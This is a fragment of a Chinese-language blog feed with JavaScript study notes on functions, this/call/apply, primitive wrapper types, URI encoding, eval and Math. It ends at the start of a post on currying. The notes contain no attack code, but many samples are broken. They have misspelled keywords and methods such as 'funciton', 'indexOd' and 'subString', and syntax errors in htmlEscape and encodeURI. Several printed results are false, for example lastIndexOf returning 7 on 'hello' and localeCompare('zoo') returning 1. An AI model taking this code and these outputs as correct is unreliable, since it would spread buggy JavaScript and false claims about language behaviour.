class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">function addNumber(num)&#123;</span><br><span class="line">    return num + 100;</span><br><span class="line">&#125;</span><br><span class="line">funciton addNumber(num)&#123;</span><br><span class="line">    return num + 200;</span><br><span class="line">&#125;</span><br><span class="line">var result = addNumber(100);   //300</span><br></pre></td></tr></table></figure><h3 id="函数声明与函数表达式："><a href="#函数声明与函数表达式：" class="headerlink" title="函数声明与函数表达式："></a>函数声明与函数表达式：</h3><p>解析器会率先读取函数声明，并使其在执行任何代码之前可用<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">alert(sum(0,10));</span><br><span class="line">function sum(num1,num2)&#123;</span><br><span class="line">    return num1 + num2;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><h3 id="作为值的函数："><a href="#作为值的函数：" class="headerlink" title="作为值的函数："></a>作为值的函数：</h3><p>可以像传递参数一样把一个函数传递给另一个函数<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">function callSomeFunction(someFunction,someArgument)&#123;</span><br><span class="line">    return someFunction(someArgument);</span><br><span class="line">&#125;</span><br><span class="line">function add10(num)&#123;</span><br><span class="line">    return num + 10;</span><br><span class="line">&#125;</span><br><span class="line">function greeting(name)&#123;</span><br><span class="line">    return &quot;Hello &quot; + name;</span><br><span class="line">&#125;</span><br><span class="line">var result = callSomeFunction(add10,10);</span><br><span class="line">alert(result);   //20</span><br><span class="line">var result2 = callSomeFunction(greeting,&quot;Van&quot;);</span><br><span class="line">alert(result2);   //&quot;Hello Van&quot;</span><br></pre></td></tr></table></figure></p><p>可以将一个函数作为另一个函数的结果返回<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">function createComparisonFunction(propertyName)&#123;</span><br><span class="line">    return function (object1,object2)&#123;</span><br><span class="line">        var value1 = object1[propertyName];</span><br><span class="line">        var value2 = object2[propertyName];</span><br><span class="line">        if(value1 &lt; value2)&#123;</span><br><span class="line">            return -1;</span><br><span class="line">        &#125;else if(value1 &gt; value2)&#123;</span><br><span class="line">            return 1;</span><br><span class="line">        &#125;else&#123;</span><br><span class="line">            return 0;</span><br><span class="line">        &#125;    </span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><h3 id="函数内部属性："><a href="#函数内部属性：" class="headerlink" title="函数内部属性："></a>函数内部属性：</h3><h4 id="callee"><a href="#callee" class="headerlink" title="callee:"></a>callee:</h4><p>一个指针，指向拥有这个arguments对象的函数<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">//函数执行与函数名&quot;factorial&quot;紧耦合在一起</span><br><span class="line">function factorial(num)&#123;</span><br><span class="line">    if(num &lt;= 1)&#123;</span><br><span class="line">        return 1;</span><br><span class="line">    &#125;else&#123;</span><br><span class="line">        return num * factorial(num-1);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">//无论函数取什么名字都能正常递归</span><br><span class="line">function factorial(num)&#123;</span><br><span class="line">    if(num &lt;= 1)&#123;</span><br><span class="line">        return 1;</span><br><span class="line">    &#125;else&#123;</span><br><span class="line">        return num * arguments.callee(num-1);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><h4 id="this："><a href="#this：" class="headerlink" title="this："></a>this：</h4><p>引用函数当前执行的环境对象<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">window.color = &quot;red&quot;;</span><br><span class="line">var o = &#123;color:&quot;blue&quot;&#125;;</span><br><span class="line">function sayColor()&#123;</span><br><span class="line">    alert(this.color);</span><br><span class="line">&#125;</span><br><span class="line">sayColor();  //&quot;red&quot;，this为全局对象</span><br><span class="line">o.sayColor = sayColor;</span><br><span class="line">alert(0.sayColor());  //&quot;blue&quot;，this为对象o</span><br></pre></td></tr></table></figure></p><h4 id="caller"><a href="#caller" class="headerlink" title="caller:"></a>caller:</h4><p>ES5引入，保存调用当前函数的函数引用，如果实在全局调用，其值为null<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">function outer()&#123;</span><br><span class="line">    inner();</span><br><span class="line">&#125;</span><br><span class="line">function inner()&#123;</span><br><span class="line">    alert(inner.caller); //可解耦合写成alert(arguments.callee.caller)</span><br><span class="line">&#125;</span><br><span class="line">outer();  //outer</span><br></pre></td></tr></table></figure></p><h3 id="函数的属性和方法："><a href="#函数的属性和方法：" class="headerlink" title="函数的属性和方法："></a>函数的属性和方法：</h3><h4 id="length属性"><a href="#length属性" class="headerlink" title="length属性:"></a>length属性:</h4><p>表示函数希望接收的命名参数个数<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">function sayName(name)&#123;&#125;</span><br><span class="line">function sum(num1,num2)&#123;&#125;</span><br><span class="line">function sayHi()&#123;&#125;</span><br><span class="line">alert(sayName.length);  //1</span><br><span class="line">alert(sum.length);  //2</span><br><span class="line">alert(sayHi.length);  //0</span><br></pre></td></tr></table></figure></p><h4 id="prototype属性"><a href="#prototype属性" class="headerlink" title="prototype属性:"></a>prototype属性:</h4><p>保存它们所有实例方法的真正所在</p><h4 id="function-apply"><a href="#function-apply" class="headerlink" title="function apply:"></a>function apply:</h4><p>在特定的作用域中调用函数<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">function sum(num1,num2)&#123;</span><br><span class="line">    return num1 + num2;</span><br><span class="line">&#125;</span><br><span class="line">function callSum1(num1,num2)&#123;</span><br><span class="line">    return sum.apply(this,arguments);</span><br><span class="line">&#125;</span><br><span class="line">function callSum2(num1,num2)&#123;</span><br><span class="line">    return sum.apply(this,[num1,num2]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><h4 id="function-apply-1"><a href="#function-apply-1" class="headerlink" title="function apply:"></a>function apply:</h4><p>与apply方法的作用相同，区别在于除了第一个参数this,其余参数都须直接传给函数<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">function sum(num1,num2)&#123;</span><br><span class="line">    return num1 + num2;</span><br><span class="line">&#125;</span><br><span class="line">function callSum(num1,num2)&#123;</span><br><span class="line">    return sum.call(this,num1,num2);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>apply()和call()真正强大是能够扩充函数赖以运行的作用域<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">window.color = &quot;red&quot;;</span><br><span class="line">var o = &#123;color:&quot;blue&quot;&#125;;</span><br><span class="line">function sayColor()&#123;</span><br><span class="line">    alert(this.color);</span><br><span class="line">&#125;</span><br><span class="line">sayColor();  //&quot;red&quot;</span><br><span class="line">sayColor.call(this);  //&quot;red&quot;</span><br><span class="line">sayColor.call(window);  //&quot;red&quot;</span><br><span class="line">sayColor.call(o);   //&quot;blue&quot;</span><br></pre></td></tr></table></figure></p><p>用这种方法来扩充作用域对象不需要与方法有任何耦合关系</p><h2 id="基本包装类型"><a href="#基本包装类型" class="headerlink" title="基本包装类型"></a>基本包装类型</h2><h3 id="Boolean类型："><a href="#Boolean类型：" class="headerlink" title="Boolean类型："></a>Boolean类型：</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">var falseObject = new Boolean(false);</span><br><span class="line">var result = falseObjet &amp;&amp; true;</span><br><span class="line">alert(result);  //true</span><br><span class="line">var falseValue = false;</span><br><span class="line">result = falseValue &amp;&amp; true;</span><br><span class="line">alert(result);  //false</span><br></pre></td></tr></table></figure><h3 id="Number类型："><a href="#Number类型：" class="headerlink" title="Number类型："></a>Number类型：</h3><p>Number类型重写了valueOf,toLocalString和toString方法<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">var num = 10;</span><br><span class="line">alert(num.toString());   //&quot;10&quot;，默认十进制表示</span><br><span class="line">alert(num.toString(2));  //&quot;1010&quot;，二进制表示</span><br><span class="line">alert(num.toFixed(2));   //&quot;10.00&quot;，按照指定小数位返回</span><br><span class="line">alert(num.toExponential(1));   //&quot;1.0e+1&quot;，按照指定位数返回指数表示法</span><br></pre></td></tr></table></figure></p><h3 id="String类型："><a href="#String类型：" class="headerlink" title="String类型："></a>String类型：</h3><h4 id="字符方法："><a href="#字符方法：" class="headerlink" title="字符方法："></a>字符方法：</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">var stringValue = &quot;hello world&quot;;</span><br><span class="line">alert(stringValue.charAt(1));  //&quot;e&quot;</span><br><span class="line">alert(stringValue.charCodeAt(1));  //&quot;101&quot;,小写字母e字符编码</span><br></pre></td></tr></table></figure><h4 id="字符串操作方法："><a href="#字符串操作方法：" class="headerlink" title="字符串操作方法："></a>字符串操作方法：</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">var stringValue = &quot;hello&quot;;</span><br><span class="line">var result = stringValue.concat(&quot; world&quot;,&quot;!&quot;);  //返回新字符串</span><br><span class="line">alert(result);  //&quot;hello world!&quot;</span><br><span class="line">alert(stringValue);  //&quot;hello&quot;</span><br><span class="line"></span><br><span class="line">var stringValue = &quot;hello world&quot;;</span><br><span class="line">alert(stringValue.slice(3));  //&quot;lo world&quot;</span><br><span class="line">alert(stringValue.subString(3));  //&quot;lo world&quot;</span><br><span class="line">alert(stringValue.subStr(3));  //&quot;lo world&quot;</span><br><span class="line"></span><br><span class="line">alert(stringValue.slice(3,7));  //&quot;lo w&quot;，起始位置，结束位置</span><br><span class="line">alert(stringValue.subString(3,7));  //&quot;lo w&quot;，同上</span><br><span class="line">alert(stringValue.subStr(3,7));  //&quot;lo worl&quot;，起始位置，返回字符个数</span><br><span class="line"></span><br><span class="line">alert(stringValue.slice(-3));  //&quot;rld&quot;</span><br><span class="line">alert(stringValue.subString(-3));  //&quot;hello world&quot;，把所有负数转换成0</span><br><span class="line">alert(stringValue.subStr(-3));  //&quot;rld&quot;，负数加上数组长度</span><br><span class="line"></span><br><span class="line">alert(stringValue.slice(3,-4));  //&quot;lo w&quot;</span><br><span class="line">alert(stringValue.subString(3,-4));  //&quot;hel&quot;，把负数变成0，从小的开始</span><br><span class="line">alert(stringValue.subStr(3,-4));  //&quot; &quot;，把负数变成0</span><br></pre></td></tr></table></figure><h4 id="字符串位置方法："><a href="#字符串位置方法：" class="headerlink" title="字符串位置方法："></a>字符串位置方法：</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">var stringValue = &quot;hello&quot;;</span><br><span class="line">alert(stringValue.indexOd(&quot;o&quot;));  //4</span><br><span class="line">alert(stringValue.lastIndexOf(&quot;o&quot;));  //7</span><br></pre></td></tr></table></figure><p>可以通过循环调用，来找到所有匹配的子字符串<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">var stringValue = &quot;Lorem ipsum color sit amet, consectetur adipisicing elit&quot;;</span><br><span class="line">var positions = new Array();</span><br><span class="line">var pos = stringValue.indexOf(&quot;e&quot;);</span><br><span class="line">while(pos&gt;-1)&#123;</span><br><span class="line">    positions.push(pos);</span><br><span class="line">    pos = stringValue.indexOf(&quot;e&quot;,pos+1);</span><br><span class="line">&#125;</span><br><span class="line">alert(positions);  //&quot;3,24,32,35,52&quot;</span><br></pre></td></tr></table></figure></p><h4 id="trim方法："><a href="#trim方法：" class="headerlink" title="trim方法："></a>trim方法：</h4><p>喊出前置和后缀的所有空格<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">var stringValue = &quot;  hello world&quot;;</span><br><span class="line">var trimedString = stringValue.trim();</span><br><span class="line">alert(stringValue);  //&quot;  hello world&quot;</span><br><span class="line">alert(trimedString);  //&quot;hello world&quot;</span><br></pre></td></tr></table></figure></p><h4 id="字符串大小写转换方法："><a href="#字符串大小写转换方法：" class="headerlink" title="字符串大小写转换方法："></a>字符串大小写转换方法：</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">var stringValue = &quot;hello world&quot;;</span><br><span class="line">alert(stringValue.toLocaleUpperCase());   //&quot;HELLO WORLD&quot;</span><br><span class="line">alert(stringValue.toUpperCase());   //&quot;HELLO WORLD&quot;</span><br><span class="line">alert(stringValue.toLocaleLowerCase());   //&quot;hello world&quot;</span><br><span class="line">alert(stringValue.toLowerCase());   //&quot;hello world&quot;</span><br></pre></td></tr></table></figure><h4 id="字符串模式匹配方法："><a href="#字符串模式匹配方法：" class="headerlink" title="字符串模式匹配方法："></a>字符串模式匹配方法：</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">var text = &quot;cat,bat,sat,fat&quot;;</span><br><span class="line">var pattern = /.at/;</span><br><span class="line">//与pattern.exec()相同</span><br><span class="line">var matches = text.match(pattern);</span><br><span class="line">alert(matches.index);  //0</span><br><span class="line">alert(matches[0]);  //&quot;cat&quot;，返回第一个匹配的字符串</span><br><span class="line">alert(pattern.lastIndex);  //0</span><br><span class="line"></span><br><span class="line">var pos = text.search(/at/);</span><br><span class="line">alert(pos);  //1，返回第一个匹配项的索引，没有找到则返回-1</span><br><span class="line">var result = text.replace(&quot;at&quot;,&quot;ond&quot;);  //只替换第一个子字符串</span><br><span class="line">alert(result);  //&quot;cond,bat,sat,fat&quot;</span><br><span class="line">result = text.replace(/at/g,&quot;ond&quot;);</span><br><span class="line">alert(result);  //&quot;cond,bond,sond,fond&quot;</span><br></pre></td></tr></table></figure><p>使用replace第二个参数，可以实现更加精细的替换<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">function htmlEscape(text)&#123;</span><br><span class="line">    return text.replace(/[&lt;&gt;&quot;&amp;]/g,function(match,pos,orignalText))&#123;</span><br><span class="line">        switch(match)&#123;</span><br><span class="line">            case &quot;&lt;&quot;:</span><br><span class="line">                return &quot;&amp;lt&quot;;</span><br><span class="line">            case &quot;&gt;&quot;:</span><br><span class="line">                return &quot;&amp;gt&quot;;</span><br><span class="line">            case &quot;&amp;&quot;:</span><br><span class="line">                return &quot;&amp;amp&quot;;</span><br><span class="line">            case &quot;\&quot;&quot;:</span><br><span class="line">                return &quot;&amp;quot&quot;;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><h4 id="split方法："><a href="#split方法：" class="headerlink" title="split方法："></a>split方法：</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">var colorText = &quot;red,blue,green,yellow&quot;;</span><br><span class="line">var colors1 = colorText.split(&quot;,&quot;);  //[&quot;red&quot;,&quot;blue&quot;,&quot;green&quot;,&quot;yellow&quot;]</span><br><span class="line">var colors2 = colorText.split(&quot;,&quot;,2);  //[&quot;red&quot;,&quot;blue&quot;]，只包含两项</span><br><span class="line">var colors2 = colorText.split(/[^\,]t/);  //[&quot;&quot;,&quot;&quot;,&quot;&quot;,&quot;&quot;]</span><br></pre></td></tr></table></figure><h4 id="LocaleCompare方法："><a href="#LocaleCompare方法：" class="headerlink" title="LocaleCompare方法："></a>LocaleCompare方法：</h4><p>比较两个字符串，如果字符串在字母表中应该排在字符串参数之前，则返回负数，排在之后，则返回一个正数，等于则返回0<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">var stringValue = &quot;yellow&quot;;</span><br><span class="line">alert(stringValue.localeCompare(&quot;black&quot;));  //1</span><br><span class="line">alert(stringValue.localeCompare(&quot;yellow&quot;));  //0</span><br><span class="line">alert(stringValue.localeCompare(&quot;zoo&quot;));  //1</span><br></pre></td></tr></table></figure></p><h4 id="fromCharCode方法："><a href="#fromCharCode方法：" class="headerlink" title="fromCharCode方法："></a>fromCharCode方法：</h4><p>接收一或多个字符编码，将它们转换成一个字符串<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">alert(String.fromCharCode(104,101,108,108,111));  //&quot;hello&quot;</span><br></pre></td></tr></table></figure></p><h2 id="单体内置对象"><a href="#单体内置对象" class="headerlink" title="单体内置对象"></a>单体内置对象</h2><p>开发人员不必显示的实例化内置对象</p><h3 id="Global对象"><a href="#Global对象" class="headerlink" title="Global对象"></a>Global对象</h3><h4 id="URI编码方法"><a href="#URI编码方法" class="headerlink" title="URI编码方法"></a>URI编码方法</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">var uri = &quot;http://www.wrox.com/illegal.value.html#start&quot;;</span><br><span class="line">alert(encodeURI(url);  </span><br><span class="line">//https://www.wrox.com/illegal%20value.html#start</span><br><span class="line">alert(encodeURIComponent(url));  </span><br><span class="line">//https%3A%2F%2Fwww.wrox.com%2Fillegal%20value.html%23start</span><br></pre></td></tr></table></figure><p>encodeURI不会对URI本身进行编码<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">var uri2 = &quot;https%3A%2F%2Fwww.wrox.com%2Fillegal%20value.html%23start&quot;;</span><br><span class="line">alert(decodeURI(uri)); </span><br><span class="line">//https%3A%2F%2Fwww.wrox.com%2Fillegal%20value.html%23start</span><br><span class="line">alert(decodeURIComponent(uri));</span><br><span class="line">//https://www.wrox.com/illegal%20value.html#start</span><br></pre></td></tr></table></figure></p><p>decodeURI只能对encodeURI转换后的字符进行解码，而decodeURIComponent会将所有特殊字符解码</p><h4 id="eval方法"><a href="#eval方法" class="headerlink" title="eval方法"></a>eval方法</h4><p>通过eval执行的代码被认为是包含该次调用的执行环境的一部分，因此被执行的代码具有与该执行环境相同的作用域链<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">var msg = &quot;hello world&quot;;</span><br><span class="line">eval(&quot;alert(msg)&quot;);  //&quot;hello world&quot;</span><br></pre></td></tr></table></figure></p><h4 id="window对象"><a href="#window对象" class="headerlink" title="window对象"></a>window对象</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">var color = &quot;red&quot;;</span><br><span class="line">function sayColor()&#123;</span><br><span class="line">    alert(window.color);</span><br><span class="line">&#125;</span><br><span class="line">window.sayColor();  //&quot;red&quot;</span><br></pre></td></tr></table></figure><h3 id="Math对象"><a href="#Math对象" class="headerlink" title="Math对象"></a>Math对象</h3><h4 id="min和max方法"><a href="#min和max方法" class="headerlink" title="min和max方法"></a>min和max方法</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">var max = Math.max(3,54,32,16);</span><br><span class="line">alert(max);  //54</span><br><span class="line">var min = Math.min(3,54,32,16);</span><br><span class="line">alert(min);  //3</span><br></pre></td></tr></table></figure><p>可以使用apply方法<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">var values = [1,2,3,4,5,6,7,8];</span><br><span class="line">var max = Math.max.apply(Math,values);</span><br></pre></td></tr></table></figure></p><h4 id="四舍五入方法"><a href="#四舍五入方法" class="headerlink" title="四舍五入方法"></a>四舍五入方法</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">alert(Math.ceil(25.9));  //总是将数值向上舍入为最近的整数，26</span><br><span class="line">alert(Math.floor(25.9));  //总是将数值向下舍入为最近的整数，25</span><br><span class="line">alert(Math.round(25.9));  //四舍五入为最近的整数，26</span><br></pre></td></tr></table></figure><h4 id="random方法"><a href="#random方法" class="headerlink" title="random方法"></a>random方法</h4><p>值：Math.floor(Math.random()*可能的值的总数+第一个可能的值)<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">var num = Math.floor(Math.random()*9+2);  //返回2-10的值</span><br></pre></td></tr></table></figure></p>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;定义&quot;&gt;&lt;a href=&quot;#定义&quot; class=&quot;headerlink&quot; title=&quot;定义&quot;&gt;&lt;/a&gt;定义&lt;/h2&gt;&lt;p&gt;引用类型的值（对象）是引用类型的一个实例。&lt;br&gt;引用类型是一种数据结构，用于将数据和功能组织在一起。&lt;/p&gt;
&lt;h2 id=&quot;Object类型&quot;&gt;&lt;a href=&quot;#Object类型&quot; class=&quot;headerlink&quot; title=&quot;Object类型&quot;&gt;&lt;/a&gt;Object类型&lt;/h2&gt;&lt;h3 id=&quot;创建方式：&quot;&gt;&lt;a href=&quot;#创建方式：&quot; class=&quot;headerlink&quot; title=&quot;创建方式：&quot;&gt;&lt;/a&gt;创建方式：&lt;/h3&gt;&lt;p&gt;使用new操作符后跟Object构造函数。&lt;br&gt;&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;var person = new Object();   //与 var person = &amp;#123;&amp;#125; 等同&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;person.name = &amp;quot;Nicholas&amp;quot;;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;person.age = 29;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
    
    </summary>
    
      <category term="前端" scheme="http://dangoying.ink/categories/%E5%89%8D%E7%AB%AF/"/>
    
    
      <category term="前端" scheme="http://dangoying.ink/tags/%E5%89%8D%E7%AB%AF/"/>
    
  </entry>
  
  <entry>
    <title>函数柯里化</title>
    <link href="http://dangoying.ink/%E5%87%BD%E6%95%B0%E6%9F%AF%E9%87%8C%E5%8C%96.html"/>
    <id>http://dangoying.ink/函数柯里化.html</id>
    <published>2019-06-13T13:56:58.000Z</published>
    <updated>2019-06-16T10:51:23.332Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>老是听大佬们口中谈及函数柯里化，在没有了解之前，我一直认为这是一个十分高深的东西，然而在接触后也深深被他的魅力吸引，那么究竟什么是柯里化？柯里化又有什么好处？作为一个前端工程狮，这是你必须掌握的高级技能。</p></blockquote><h2 id="什么是柯里化-Currying"><a href="#什么是柯里化-Currying" class="headerlink" title="什么是柯里化(Currying)"></a>什么是柯里化(Currying)</h2><p>柯里化是把接受多个参数的函数变换成接受一个单一参数（最初函数的第一个参数）的函数，并且返回接受余下的参数且返回结果的新函数的技术。也就是将具有多个元的函数转化为具有较少元的函数。</p><a id="more"></a><p>来看下面的例子<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">function add(a,b,c)&#123;</span><br><span class="line">    return a + b + c;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">function curryingAdd(a)&#123;</span><br><span class="line">    return function(b)&#123;</span><br><span class="line">        return function(c)&#123;</span><br><span class="line">            return a + b + c;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">add(1,2,3);             //3 </span><br><span class="line">curryingAdd(1)(2)(3);   //3</span><br></pre></td></tr></table></figure></p><h2 id="Currying的核心思想"><a href="#Currying的核心思想" class="headerlink" title="Currying的核心思想"></a>Currying的核心思想</h2><p>柯里化的核心思想就是降低通用性，提高适用性。<br>举个例子说明<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Ajax(&quot;get&quot;,&quot;url&quot;,&quot;data&quot;);</span><br><span class="line">Ajaxget(&quot;url&quot;,&quot;data&quot;);</span><br></pre></td></tr></table></figure></p><p>上述代码中，Ajax是一个通用性的方法，而Ajaxget是一个只针对get请求的方法，从性能上来看，通用性的方法需要对请求的类型进行判断，而通过调用Ajaxget可以减少判断，同时我们可以直接从api上得知请求的类型，对于后期的开发维护也有帮助。</p><h2 id="Currying的特点"><a href="#Currying的特点" class="headerlink" 